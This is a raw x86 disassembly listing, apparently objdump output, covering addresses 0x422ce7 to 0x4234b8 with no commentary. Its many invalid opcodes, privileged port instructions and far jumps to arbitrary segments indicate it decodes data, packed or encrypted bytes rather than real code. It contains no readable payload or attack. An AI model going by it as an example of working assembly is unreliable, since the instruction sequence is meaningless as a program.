  422ce7:	mov    bh,0xf9
  422ce9:	pushf  
  422cea:	in     eax,0xb3
  422cec:	jp     0x422d16
  422cee:	push   0x7725d1d1
  422cf3:	fsub   st(7),st
  422cf5:	xor    al,BYTE PTR [ebx]
  422cf7:	xor    edx,DWORD PTR [ecx-0x46b5c271]
  422cfd:	sub    BYTE PTR [eax-0x424e1b93],ch
  422d03:	add    eax,0x1d986d97
  422d08:	push   ds
  422d09:	scas   eax,DWORD PTR es:[edi]
  422d0a:	test   eax,0x2b017a20
  422d0f:	pop    ds
  422d10:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  422d12:	call   0x86bc:0x4320d176
  422d19:	fisttp WORD PTR [eax+0x45932dc5]
  422d1f:	push   edx
  422d20:	imul   ebp,DWORD PTR [edx],0xd06582
  422d26:	add    edx,DWORD PTR [esi]
  422d28:	mov    edx,0x26684835
  422d2d:	mov    cl,0xea
  422d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d30:	aaa    
  422d31:	fsubr  DWORD PTR [ebp-0x2d]
  422d34:	inc    edx
  422d35:	cmp    DWORD PTR [edi+0x75],esi
  422d38:	and    dh,BYTE PTR [edi]
  422d3a:	cmp    cl,BYTE PTR [eax-0x4342595a]
  422d40:	jns    0x422d04
  422d42:	not    esi
  422d44:	test   dl,0x97
  422d47:	inc    ebp
  422d48:	(bad)  
  422d4a:	mov    edx,0x3819a4b1
  422d4f:	fcmovb st,st(6)
  422d51:	add    edx,DWORD PTR [ecx+0x5309998d]
  422d57:	mov    ds:0x85131b2,al
  422d5c:	das    
  422d5d:	out    0x9d,eax
  422d5f:	push   edx
  422d60:	inc    edi
  422d61:	push   ecx
  422d62:	jae    0x422d56
  422d64:	loop   0x422da1
  422d66:	shl    dh,cl
  422d68:	nop
  422d69:	mov    WORD PTR ds:0xa3f52c6a,cs
  422d6f:	lea    edx,[esi-0x28fa6a1]
  422d75:	adc    al,0x3d
  422d77:	and    edi,ebx
  422d79:	jmp    0x30f5:0x198c7e0d
  422d80:	jns    0x422dfb
  422d82:	or     eax,0xf262fa37
  422d87:	adc    ebx,DWORD PTR [edx-0x6307e296]
  422d8d:	mov    edx,0x1b162bfb
  422d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d93:	push   0xffffffbe
  422d95:	lock cmp eax,0xe1a52a8
  422d9b:	shl    DWORD PTR [esi-0x25b294d5],cl
  422da1:	aaa    
  422da2:	outs   dx,DWORD PTR ds:[esi]
  422da3:	mov    al,0x77
  422da5:	cwde   
  422da6:	icebp  
  422da7:	sti    
  422da8:	pop    edi
  422da9:	jno    0x422d2c
  422dab:	sub    BYTE PTR [edx],dh
  422dad:	emms   
  422daf:	fiadd  WORD PTR [ebp+0x3a]
  422db2:	idiv   ch
  422db4:	das    
  422db5:	(bad)  
  422db6:	imul   edx,DWORD PTR [edx],0xcdb34fc0
  422dbc:	sub    al,0x65
  422dbe:	xor    al,0x64
  422dc0:	aam    0x85
  422dc2:	dec    esi
  422dc3:	adc    ah,dl
  422dc5:	dec    dx
  422dc7:	cmp    DWORD PTR [edx+0x6e262804],esi
  422dcd:	xor    DWORD PTR [ebp+0x41],esi
  422dd0:	add    eax,0x62e4727c
  422dd5:	pop    ebp
  422dd6:	sub    al,0xac
  422dd8:	jno    0x422e55
  422dda:	fnstsw WORD PTR [edi-0x3d8dff14]
  422de0:	xor    cl,bh
  422de2:	repz mov edx,0x6ece38cb
  422de8:	cmp    eax,0x4d284c4d
  422ded:	(bad)  
  422dee:	or     al,0x92
  422df0:	iret   
  422df1:	cmp    dl,bh
  422df3:	mov    cl,0x49
  422df5:	test   BYTE PTR [esi+0x248a55ec],0xb4
  422dfc:	jge    0x422e4d
  422dfe:	mov    dl,0x28
  422e00:	out    dx,al
  422e01:	jbe    0x422dbd
  422e03:	mov    dl,0xcc
  422e05:	mov    ch,0x56
  422e07:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e09:	sub    bl,BYTE PTR [ebx-0x2d1f2f05]
  422e0f:	cmp    edx,DWORD PTR [esp+ecx*1-0x61]
  422e13:	and    DWORD PTR [edx+0x514b0dfd],eax
  422e19:	dec    esi
  422e1a:	int3   
  422e1b:	inc    esp
  422e1c:	mov    dh,0x63
  422e1e:	or     esp,DWORD PTR [ebp-0x5]
  422e21:	pop    esp
  422e22:	adc    bh,BYTE PTR [edi+0x60]
  422e25:	js     0x422dc5
  422e27:	(bad)  
  422e28:	cmp    eax,0xd2b48d53
  422e2d:	inc    eax
  422e2e:	cmp    eax,0x58a63ece
  422e33:	mov    DWORD PTR [esi+0x22b92235],edx
  422e39:	call   0x88338987
  422e3e:	das    
  422e3f:	fdivr  QWORD PTR [ebp-0x711dd41f]
  422e45:	sub    DWORD PTR [eax-0x5a],esp
  422e48:	sub    al,0xa1
  422e4a:	push   ebx
  422e4b:	adc    ah,dh
  422e4d:	fnstsw WORD PTR [eax]
  422e4f:	rol    BYTE PTR [ecx],0x99
  422e52:	sbb    eax,0x15274f06
  422e57:	push   cs
  422e58:	mov    ah,0x7
  422e5a:	clc    
  422e5b:	out    0x33,eax
  422e5d:	push   esp
  422e5e:	shl    BYTE PTR [ebx+0x8],0x13
  422e62:	lock pop ds
  422e64:	paddsb mm0,QWORD PTR [edi-0x12f0268b]
  422e6b:	sbb    eax,0xa3c530
  422e70:	(bad)  
  422e71:	push   0xb0b2a514
  422e76:	mov    ebx,0x2c19ad46
  422e7b:	inc    ebp
  422e7c:	jmp    0x6700:0xf1bacc71
  422e83:	xor    cl,BYTE PTR [ecx+edi*4+0x19]
  422e87:	jmp    0x422e35
  422e89:	cs dec edx
  422e8b:	(bad)  
  422e8c:	cmp    al,0x7d
  422e8e:	sbb    esi,DWORD PTR [esp+ebp*4+0x6942640f]
  422e95:	xor    dl,BYTE PTR [ebx+0x6f91c932]
  422e9b:	and    BYTE PTR [eax],dl
  422e9d:	loop   0x422e40
  422e9f:	(bad)  
  422ea0:	jle    0x422e6e
  422ea2:	stos   DWORD PTR es:[edi],eax
  422ea3:	aad    0xf4
  422ea5:	add    bl,BYTE PTR [edi+edi*2-0x2c84886d]
  422eac:	lods   eax,DWORD PTR ds:[esi]
  422ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eae:	mov    eax,0xe7d39c87
  422eb3:	std    
  422eb4:	popa   
  422eb5:	push   ss
  422eb6:	fs loope 0x422f16
  422eb9:	(bad)  
  422eba:	retf   0xef2
  422ebd:	lock vhaddps ymm7,ymm0,YMMWORD PTR [edi]
  422ec2:	icebp  
  422ec3:	(bad)  
  422ec4:	mul    BYTE PTR ds:0x451a2d52
  422eca:	mov    edi,0x37ad4aff
  422ecf:	ds pop ecx
  422ed1:	addr16 lock das 
  422ed4:	sbb    al,0x20
  422ed6:	(bad)  
  422ed7:	xor    eax,0x5057c7bb
  422edc:	push   ds
  422edd:	(bad)  
  422ede:	fistp  WORD PTR [ebp-0x3a]
  422ee1:	sbb    BYTE PTR [ebp-0x5c],0x7d
  422ee5:	push   cs
  422ee6:	push   ecx
  422ee7:	or     ah,BYTE PTR [ebx+eiz*1+0x292b0366]
  422eee:	cmp    BYTE PTR [eax+0x7a],ah
  422ef1:	pusha  
  422ef2:	mov    cl,BYTE PTR [esi+0x63]
  422ef5:	nop
  422ef6:	in     al,dx
  422ef7:	add    al,0x9c
  422ef9:	retf   
  422efa:	add    al,0x0
  422efc:	outs   dx,BYTE PTR ds:[esi]
  422efd:	lahf   
  422efe:	test   al,0x3c
  422f00:	aam    0xf4
  422f02:	mul    BYTE PTR [edx]
  422f04:	lods   eax,DWORD PTR ds:[esi]
  422f05:	xchg   DWORD PTR [eax-0xd3c69b3],ebx
  422f0b:	xchg   DWORD PTR [edi],eax
  422f0d:	and    ch,BYTE PTR [eax+0x42]
  422f10:	jns    0x422eb1
  422f12:	mov    edi,0x9d63459e
  422f17:	jmp    0x422efb
  422f19:	test   al,0xcc
  422f1b:	call   0x71abdc83
  422f20:	js     0x422f1d
  422f22:	pop    edi
  422f23:	inc    eax
  422f24:	dec    esi
  422f25:	cmp    al,0xd1
  422f27:	adc    al,bh
  422f29:	sub    dl,BYTE PTR [ebp+0x3c42de6d]
  422f2f:	in     al,dx
  422f30:	jns    0x422f49
  422f32:	sbb    eax,0x950a867c
  422f37:	mov    bh,0xc0
  422f39:	leave  
  422f3a:	pusha  
  422f3b:	pop    eax
  422f3c:	int    0x2f
  422f3e:	hlt    
  422f3f:	xor    bh,0x70
  422f42:	dec    DWORD PTR [edi]
  422f44:	sbb    al,0xff
  422f46:	shl    DWORD PTR [eax],0x9a
  422f49:	pushf  
  422f4a:	jb     0x422ed0
  422f4c:	add    eax,0x2261738
  422f51:	sbb    eax,0xe2a1b601
  422f56:	loopne 0x422f41
  422f58:	and    al,0x81
  422f5a:	sub    dh,bl
  422f5c:	iret   
  422f5d:	popa   
  422f5e:	rol    bl,0x65
  422f61:	mov    esi,0x9dba29b3
  422f66:	fst    QWORD PTR [edx+0x69]
  422f69:	mov    bh,0xd3
  422f6b:	lods   eax,DWORD PTR ds:[esi]
  422f6c:	mov    dl,0x39
  422f6e:	pop    ecx
  422f6f:	in     al,dx
  422f70:	fisubr DWORD PTR [ebp-0x2b]
  422f73:	sub    al,0xca
  422f75:	loop   0x422efc
  422f77:	rol    DWORD PTR [edi-0x1a],1
  422f7a:	icebp  
  422f7b:	(bad)  
  422f7d:	mov    ds:0x888c0123,al
  422f82:	enter  0xa909,0xf4
  422f86:	in     al,dx
  422f87:	enter  0xdff7,0x69
  422f8b:	add    edx,DWORD PTR [esi+0x23]
  422f8e:	sahf   
  422f8f:	jge    0x422fda
  422f91:	add    eax,0x54ef409d
  422f96:	ret    0x5a77
  422f99:	push   esi
  422f9a:	inc    edx
  422f9b:	mov    esp,0x101bd438
  422fa0:	mov    esi,0x59988f3e
  422fa5:	push   edi
  422fa6:	ret    0xfd13
  422fa9:	or     bl,BYTE PTR [edi+0xa]
  422fac:	dec    eax
  422fad:	imul   ebp,DWORD PTR [edx-0x2e],0xffffffc6
  422fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fb2:	xchg   esi,eax
  422fb3:	push   es
  422fb4:	adc    esp,DWORD PTR [edi]
  422fb6:	fadd   QWORD PTR [edx]
  422fb8:	push   DWORD PTR [eax]
  422fba:	sbb    DWORD PTR [ecx],edi
  422fbc:	pop    edx
  422fbd:	or     dl,BYTE PTR [ecx+esi*4]
  422fc0:	add    al,0x4a
  422fc2:	test   eax,0xf437ca2f
  422fc7:	shl    edx,1
  422fc9:	sbb    DWORD PTR [edi*8-0x723c69ce],ecx
  422fd0:	(bad)  
  422fd1:	adc    ecx,DWORD PTR [esi-0x55a5ba60]
  422fd7:	xor    ecx,ebp
  422fd9:	jb     0x423010
  422fdb:	pop    edi
  422fdc:	jl     0x422fe0
  422fde:	ja     0x422fad
  422fe0:	xor    ebp,DWORD PTR [ebx+0xa15eb6]
  422fe6:	add    BYTE PTR [eax],al
  422fe8:	add    BYTE PTR [eax],al
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x423066
  422ff7:	adc    eax,DWORD PTR [ebx+0x2f]
  422ffa:	outs   dx,BYTE PTR ds:[esi]
  422ffb:	mov    esi,0x6830001
  423000:	add    BYTE PTR [eax],al
  423002:	in     eax,dx
  423003:	js     0x423013
  423005:	push   esp
  423006:	call   0x6cdbfed
  42300b:	pushf  
  42300c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300d:	lea    eax,[esi+0x38]
  423010:	push   es
  423011:	fisub  DWORD PTR [ebx]
  423013:	jecxz  0x42304e
  423015:	dec    ecx
  423016:	dec    ebx
  423017:	mov    cl,0x38
  423019:	inc    edx
  42301a:	jmp    0x42302f
  42301c:	fbld   TBYTE PTR [edi]
  42301e:	lock in eax,0x2d
  423021:	push   ebx
  423022:	outs   dx,DWORD PTR ds:[esi]
  423023:	(bad)  
  423024:	inc    ebp
  423025:	outs   dx,DWORD PTR ds:[esi]
  423026:	ret    0x5d58
  423029:	adc    DWORD PTR [ecx+ebp*1+0x33],edx
  42302d:	mov    ebx,0x70dddc56
  423032:	cmp    BYTE PTR [ebp+0x4b895d19],ah
  423038:	call   0x1a4f:0x3986d181
  42303f:	in     al,0x34
  423041:	lds    esp,FWORD PTR [esi+0x32242d64]
  423047:	jmp    0xb79e:0xbac91837
  42304e:	jae    0x42306f
  423050:	fwait
  423051:	mov    ah,0xf
  423053:	int3   
  423054:	ss xchg ecx,eax
  423056:	add    DWORD PTR [edi],edi
  423058:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42305a:	xor    eax,0x5ab0288d
  42305f:	jl     0x4230b9
  423061:	and    al,0x4
  423063:	push   ebp
  423064:	out    dx,al
  423065:	jb     0x423048
  423067:	js     0x4230c7
  423069:	lea    edx,[ecx+0xd75a018]
  42306f:	jmp    0x2f3cc57b
  423074:	cli    
  423075:	ja     0x423073
  423077:	mov    esi,0x1afe06a7
  42307c:	or     BYTE PTR [edx-0x2],al
  42307f:	push   ebp
  423080:	hlt    
  423081:	(bad)  
  423082:	test   bl,0xe4
  423085:	push   ds
  423086:	add    esi,DWORD PTR [ebx-0x2d653e85]
  42308c:	mov    esi,0xdf49d7d7
  423091:	inc    esi
  423092:	shl    DWORD PTR [ebx+0x7280fe2a],1
  423098:	push   esi
  423099:	mov    eax,DWORD PTR [ebx+0x5e]
  42309c:	mov    ?,WORD PTR [esi+ebx*2+0x6e17fa32]
  4230a3:	fs aaa 
  4230a5:	mov    eax,ds:0x8bc85ac3
  4230aa:	dec    edx
  4230ab:	add    esi,DWORD PTR [ebp-0x2b]
  4230ae:	xchg   ebx,eax
  4230af:	jnp    0x42306f
  4230b1:	clc    
  4230b2:	into   
  4230b3:	outs   dx,DWORD PTR ds:[esi]
  4230b4:	jl     0x42303f
  4230b6:	pop    ebx
  4230b7:	ins    BYTE PTR es:[edi],dx
  4230b8:	dec    esi
  4230b9:	test   BYTE PTR [eax+0x48672c6f],dl
  4230bf:	or     BYTE PTR [edi+0x5fe7c257],dh
  4230c5:	js     0x4230b3
  4230c7:	(bad)  
  4230c8:	xchg   esi,eax
  4230c9:	fisubr DWORD PTR [ebx]
  4230cb:	push   ecx
  4230cc:	and    dl,cl
  4230ce:	(bad)  
  4230d0:	and    BYTE PTR [edi+0x6fd9a57b],ah
  4230d6:	mov    eax,ds:0xf3cfd728
  4230db:	adc    DWORD PTR [ecx],esp
  4230dd:	mov    ch,BYTE PTR [ebp+ecx*8-0x27]
  4230e1:	outs   dx,DWORD PTR ds:[esi]
  4230e2:	jmp    0x4230d2
  4230e4:	and    ecx,edx
  4230e6:	and    ch,bl
  4230e8:	adc    DWORD PTR [ebp-0x45],edx
  4230eb:	add    al,0x4
  4230ed:	sbb    eax,0x1053dcf4
  4230f2:	loopne 0x423079
  4230f4:	pop    ecx
  4230f5:	popa   
  4230f6:	xor    al,0x2e
  4230f8:	or     al,0xa3
  4230fb:	mov    ch,0x49
  4230fd:	jns    0x423156
  4230ff:	scas   al,BYTE PTR es:[edi]
  423100:	sbb    eax,0x77213c2
  423105:	in     al,0x14
  423107:	imul   edi,DWORD PTR [ebx-0x40],0xb69ca087
  42310e:	pop    ebx
  42310f:	shl    BYTE PTR [edx],cl
  423111:	add    DWORD PTR [edi],0x31
  423114:	mov    esi,eax
  423116:	cmp    ah,BYTE PTR ds:0x25a4b8f7
  42311c:	jne    0x423161
  42311e:	cli    
  42311f:	mov    esi,0xb3a5c873
  423124:	pop    ecx
  423125:	xchg   esp,eax
  423126:	in     eax,dx
  423127:	repz pop ds
  423129:	push   ebx
  42312a:	push   eax
  42312b:	pop    ebp
  42312c:	lods   al,BYTE PTR ds:[esi]
  42312d:	clc    
  42312e:	xor    cl,BYTE PTR [ebx]
  423130:	cs xchg edx,eax
  423132:	jo     0x42319f
  423134:	pop    ecx
  423135:	jns    0x42313d
  423137:	fstp   TBYTE PTR [esi]
  423139:	mov    esi,0xbab33a7
  42313e:	or     DWORD PTR [ecx-0x14],eax
  423141:	fwait
  423142:	push   0xbbb70007
  423147:	out    0x5a,al
  423149:	push   0x18df70c4
  42314e:	arpl   WORD PTR fs:[esi-0x78b5a36d],bp
  423155:	inc    esi
  423156:	dec    esi
  423157:	idiv   DWORD PTR [ebx-0x79a5f359]
  42315d:	push   es
  42315e:	popa   
  42315f:	loopne 0x423155
  423161:	into   
  423162:	pusha  
  423163:	xor    ch,BYTE PTR [esi+0x2b]
  423166:	int    0x3a
  423168:	mov    esi,0xec8f325e
  42316d:	popa   
  42316e:	je     0x423119
  423170:	in     al,dx
  423171:	mov    al,ds:0x5a370a45
  423176:	xchg   esi,eax
  423177:	add    al,0x15
  423179:	pshufw mm4,mm7,0xeb
  42317d:	ret    
  42317e:	mov    ecx,ds
  423180:	pop    eax
  423181:	adc    eax,0xe1d6dfa9
  423186:	xchg   edi,eax
  423187:	or     DWORD PTR [eax+edx*2-0x30],0x19f302f0
  42318f:	ds ins BYTE PTR es:[edi],dx
  423191:	in     al,dx
  423192:	sub    DWORD PTR [ebx+edx*1-0x76],0x35
  423197:	cdq    
  423198:	dec    esi
  423199:	pop    esp
  42319a:	push   ss
  42319b:	dec    edx
  42319c:	xor    ah,al
  42319e:	leave  
  42319f:	popf   
  4231a0:	jle    0x423201
  4231a2:	mov    ah,0x4d
  4231a4:	mov    ds:0x3e688e73,eax
  4231a9:	(bad)  
  4231ab:	lea    ebp,[edi]
  4231ad:	xchg   BYTE PTR [edx],al
  4231af:	xchg   esi,eax
  4231b0:	iret   
  4231b1:	fisttp DWORD PTR [ecx]
  4231b3:	lock or al,0x3f
  4231b6:	jbe    0x4231e8
  4231b8:	cmp    eax,0x3b92b051
  4231bd:	sti    
  4231be:	rcr    DWORD PTR [ebx],1
  4231c0:	sub    dh,dl
  4231c2:	xor    bh,bh
  4231c4:	xor    al,0x2b
  4231c6:	dec    edx
  4231c7:	cs ret 
  4231c9:	xor    al,0x2e
  4231cb:	pusha  
  4231cc:	jp     0x423179
  4231ce:	xchg   BYTE PTR [esi-0x20d39b33],dl
  4231d4:	jge    0x423161
  4231d6:	inc    esp
  4231d7:	dec    ebp
  4231d8:	lods   eax,DWORD PTR ds:[esi]
  4231d9:	fild   WORD PTR [ebx]
  4231db:	addr16 mov gs,ebp
  4231de:	or     ebx,0x6a
  4231e1:	fwait
  4231e2:	test   eax,0xd0cdd660
  4231e7:	dec    ebx
  4231e8:	sbb    cl,BYTE PTR cs:[esi+0x5dfbaba8]
  4231ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231f0:	es xor eax,0x9064f66c
  4231f6:	addr16 jmp 0x14f2:0x443b8420
  4231fe:	pop    esi
  4231ff:	popf   
  423200:	ror    DWORD PTR [eax],1
  423202:	sbb    edx,edi
  423204:	mov    BYTE PTR [esi+0x6a339237],bh
  42320a:	mov    edx,0xb1c8b339
  42320f:	fs (bad) 
  423211:	call   0xeb434b1
  423216:	scas   eax,DWORD PTR es:[edi]
  423217:	push   cs
  423218:	mov    al,0xab
  42321a:	test   DWORD PTR [ecx+edx*8+0x70],edi
  42321e:	adc    ah,BYTE PTR [ebp-0x1d6cd981]
  423224:	xchg   ebp,eax
  423225:	sub    eax,0xe4be2268
  42322a:	mov    BYTE PTR [edx-0x649463b5],ch
  423230:	test   eax,0x75fc30d0
  423235:	out    dx,al
  423236:	mov    esp,0x8100a81e
  42323b:	mov    dh,0xb5
  42323d:	pop    esp
  42323e:	or     eax,0x97b90ac7
  423243:	retf   
  423244:	out    0xb6,al
  423246:	mov    edi,0x8b5c5916
  42324b:	and    ecx,esp
  42324d:	or     BYTE PTR [ebp+0x389e0643],dh
  423253:	not    esi
  423255:	sbb    ebp,esi
  423257:	mov    ebp,DWORD PTR [edi+ecx*2]
  42325a:	fcom   st(1)
  42325c:	mov    dl,0x5e
  42325e:	cs inc edx
  423260:	enter  0x7a74,0xd5
  423264:	add    DWORD PTR ds:0xf30afea,eax
  42326a:	sub    edx,DWORD PTR [esi-0x1e617db3]
  423270:	push   esp
  423271:	jae    0x423262
  423273:	rol    DWORD PTR [esi+0x19026842],cl
  423279:	pop    es
  42327a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42327b:	shr    bl,0x8f
  42327e:	push   cs
  42327f:	out    0x71,al
  423281:	xchg   DWORD PTR [ebx+0x51],eax
  423284:	xlat   BYTE PTR ds:[ebx]
  423285:	or     eax,DWORD PTR ss:[ebp+0x5e4ffdf6]
  42328c:	es jae 0x423251
  42328f:	or     eax,0x4e09a9ae
  423294:	fbld   TBYTE PTR [ecx]
  423296:	daa    
  423297:	ret    0x52eb
  42329a:	mov    bh,0xa3
  42329c:	and    eax,0xcc7ffb11
  4232a1:	xlat   BYTE PTR ds:[ebx]
  4232a2:	cli    
  4232a3:	repnz push ebp
  4232a5:	sti    
  4232a6:	mov    esi,0x491279c
  4232ab:	pop    es
  4232ac:	add    ch,BYTE PTR [ebp-0x2b]
  4232af:	cmp    al,0xaa
  4232b1:	push   esp
  4232b2:	out    0x20,al
  4232b4:	pop    eax
  4232b5:	pusha  
  4232b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232b7:	mov    dl,0xea
  4232b9:	dec    edi
  4232ba:	stos   DWORD PTR es:[edi],eax
  4232bb:	cld    
  4232bc:	hlt    
  4232bd:	and    BYTE PTR [ecx-0x4949dfa9],cl
  4232c3:	or     dh,BYTE PTR [eax+0x53]
  4232c6:	push   ss
  4232c7:	adc    esi,edi
  4232c9:	loopne 0x42329d
  4232cb:	xchg   edx,eax
  4232cc:	cmp    dl,BYTE PTR [esi-0x19]
  4232cf:	adc    BYTE PTR [esi],dh
  4232d1:	mov    al,BYTE PTR [edx-0x2b]
  4232d4:	push   esi
  4232d5:	jbe    0x42327a
  4232d7:	mov    ecx,0x55cafeaf
  4232dc:	mov    cl,0x23
  4232de:	cld    
  4232df:	jp     0x423294
  4232e1:	fs push ecx
  4232e3:	and    BYTE PTR [edx+0x1f95ee73],cl
  4232e9:	into   
  4232ea:	cmp    edi,ecx
  4232ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232ed:	xchg   edi,eax
  4232ee:	ret    
  4232ef:	add    edi,DWORD PTR [edx+0x44]
  4232f2:	dec    ebx
  4232f3:	test   eax,0xb0165dc5
  4232f8:	push   ss
  4232f9:	add    al,0xd9
  4232fb:	xor    bh,BYTE PTR [esi+0x7e]
  4232fe:	dec    eax
  4232ff:	inc    ebx
  423300:	cmp    DWORD PTR [ebp+edx*4-0x44384b74],esp
  423307:	inc    ebx
  423308:	sub    ebp,DWORD PTR [ebx+0x3e46463a]
  42330e:	fiadd  WORD PTR [ecx+ebx*2-0x47]
  423312:	test   BYTE PTR [ebp+eiz*8-0x8070120],dh
  423319:	jo     0x4232d0
  42331b:	mov    bl,0x7b
  42331d:	icebp  
  42331e:	mov    ds:0x4d4951f4,al
  423323:	aam    0xff
  423325:	push   eax
  423326:	add    eax,DWORD PTR [esi+0x21]
  423329:	cmp    DWORD PTR [esi+0x66e6bca3],ebx
  42332f:	xor    eax,eax
  423331:	scas   al,BYTE PTR es:[edi]
  423332:	push   ds
  423333:	outs   dx,BYTE PTR ds:[esi]
  423334:	out    dx,eax
  423335:	sar    BYTE PTR [edi-0x11372f1d],cl
  42333b:	clc    
  42333c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42333d:	(bad)  
  42333f:	pusha  
  423340:	ret    
  423341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423342:	pop    es
  423343:	les    eax,FWORD PTR [esi+0x37]
  423346:	xchg   edi,eax
  423347:	push   es
  423348:	pop    es
  423349:	pop    esp
  42334b:	fld    QWORD PTR [eax]
  42334d:	dec    eax
  42334e:	test   eax,0x99486ecb
  423353:	xchg   esp,eax
  423354:	mov    ah,0xf0
  423356:	push   ebx
  423357:	popa   
  423358:	cmp    ecx,edx
  42335a:	mov    esp,0xb4cd0207
  42335f:	push   ebx
  423360:	out    0xb5,eax
  423362:	lahf   
  423363:	mov    ch,0x29
  423365:	sar    eax,cl
  423367:	adc    dh,BYTE PTR [esi+eiz*1-0x6f]
  42336b:	into   
  42336c:	cmp    BYTE PTR [ebx+0x24433c6],al
  423372:	add    al,0x5
  423374:	add    al,0xc2
  423376:	mov    edi,0x4343afa8
  42337b:	sbb    al,0xe1
  42337d:	push   ebx
  42337e:	cmp    BYTE PTR [edx],0x22
  423381:	outs   dx,BYTE PTR ds:[esi]
  423382:	mov    al,ds:0xba66df97
  423387:	xchg   ecx,eax
  423388:	mov    edi,DWORD PTR [edx]
  42338a:	sar    BYTE PTR [ecx],0x6b
  42338d:	lods   eax,DWORD PTR ds:[esi]
  42338e:	loope  0x423386
  423390:	das    
  423391:	inc    esp
  423392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423393:	(bad)
  423396:	cmp    bh,BYTE PTR [edi]
  423398:	xchg   esi,eax
  423399:	shr    BYTE PTR [ebp-0x2f],cl
  42339c:	clc    
  42339d:	push   ebx
  42339e:	ins    DWORD PTR es:[edi],dx
  42339f:	dec    ebp
  4233a0:	cmc    
  4233a1:	fdivr  DWORD PTR [eax+0x62ce1c09]
  4233a7:	les    ebp,FWORD PTR [ebx+eax*8-0x5bea9986]
  4233ae:	and    eax,0xdce1ea21
  4233b3:	mov    ch,0x9f
  4233b5:	adc    al,BYTE PTR [ebx]
  4233b7:	xchg   edi,eax
  4233b8:	or     al,0x19
  4233ba:	push   edx
  4233bb:	lahf   
  4233bc:	jno    0x4233ef
  4233be:	inc    ebp
  4233bf:	sbb    bl,BYTE PTR [ebp+0x3c]
  4233c2:	sbb    esi,DWORD PTR [eax-0x1e4bb4dc]
  4233c8:	test   BYTE PTR cs:[esi+ebx*2+0x18c02c7],ah
  4233d0:	pop    esi
  4233d1:	or     DWORD PTR [ecx+0x61],eax
  4233d4:	xchg   esp,eax
  4233d5:	test   eax,0x795934f0
  4233da:	mov    edx,0xf401fa18
  4233df:	in     eax,dx
  4233e0:	nop
  4233e1:	call   0x4c73:0x3468e549
  4233e8:	cmp    eax,0x948f0399
  4233ed:	ins    DWORD PTR es:[edi],dx
  4233ee:	ret    0x2d44
  4233f1:	retf   
  4233f2:	and    DWORD PTR [eax],ebx
  4233f4:	nop
  4233f5:	dec    esi
  4233f6:	div    DWORD PTR [edx-0x30dd17e5]
  4233fc:	dec    esp
  4233fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233fe:	sbb    al,0x9
  423400:	stos   BYTE PTR es:[edi],al
  423401:	into   
  423402:	xchg   esp,eax
  423403:	sahf   
  423404:	test   al,0x20
  423406:	mov    cl,0x1f
  423408:	out    dx,eax
  423409:	ficom  WORD PTR [ecx+esi*2+0x76]
  42340d:	iret   
  42340e:	lods   eax,DWORD PTR ds:[esi]
  42340f:	sub    al,0x6
  423411:	sub    dl,BYTE PTR [ebp+0x66573b17]
  423417:	sti    
  423418:	push   ebx
  423419:	pop    ss
  42341a:	jle    0x42343c
  42341c:	pusha  
  42341d:	inc    edi
  42341e:	leave  
  42341f:	stc    
  423420:	iret   
  423421:	mov    cl,0xe8
  423423:	sbb    al,0x87
  423425:	aam    0x42
  423427:	div    BYTE PTR [edx+0x4c]
  42342a:	jge    0x42349f
  42342c:	in     al,dx
  42342d:	pop    edx
  42342e:	in     al,dx
  42342f:	inc    eax
  423430:	std    
  423431:	adc    DWORD PTR [ebp+eiz*2+0x7d3d0b],0x12
  423439:	icebp  
  42343a:	(bad)  
  42343c:	jae    0x4233c0
  42343e:	ss push ebp
  423440:	xchg   esi,eax
  423441:	pushf  
  423442:	mov    dh,0xed
  423444:	pop    edx
  423445:	xor    ebp,DWORD PTR [edi]
  423447:	add    eax,0x62a11138
  42344c:	push   ecx
  42344d:	mov    ?,WORD PTR [ebx]
  42344f:	dec    esp
  423450:	mov    ebx,DWORD PTR [esi+0x59f1eef0]
  423456:	dec    esp
  423457:	sahf   
  423458:	xlat   BYTE PTR ds:[ebx]
  423459:	mov    ebx,0x5f40ce5e
  42345e:	mov    WORD PTR [edi],es
  423460:	inc    ebx
  423461:	lds    ebp,FWORD PTR ds:0x689f0626
  423467:	jo     0x423443
  423469:	int3   
  42346a:	fwait
  42346b:	mov    esi,0xe4b112b6
  423470:	in     eax,dx
  423471:	pop    ss
  423472:	mov    edi,0x4d8e7dd2
  423477:	js     0x42348c
  423479:	popa   
  42347a:	or     cl,bh
  42347c:	test   al,0xc1
  42347e:	shr    DWORD PTR [edx-0x35],0x49
  423482:	call   0x4d32:0x34fb71fb
  423489:	xor    cl,BYTE PTR [esi-0x6d]
  42348c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42348d:	xchg   edx,eax
  42348e:	sbb    DWORD PTR [ebx+eiz*8-0x2402acb9],ebx
  423495:	repnz fwait
  423497:	dec    ecx
  423498:	sbb    BYTE PTR [edx-0x68be0d3a],cl
  42349e:	fbld   TBYTE PTR [eiz*4+0x4236ceb3]
  4234a5:	add    al,0x11
  4234a7:	repnz retf 
  4234a9:	fwait
  4234aa:	jbe    0x4234ad
  4234ac:	in     eax,0x75
  4234ae:	aam    0xa3
  4234b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234b1:	std    
  4234b2:	(bad)  
  4234b3:	aad    0x4b
  4234b5:	mov    dh,0x88
  4234b7:	fwait
  4234b8:	pop    edi
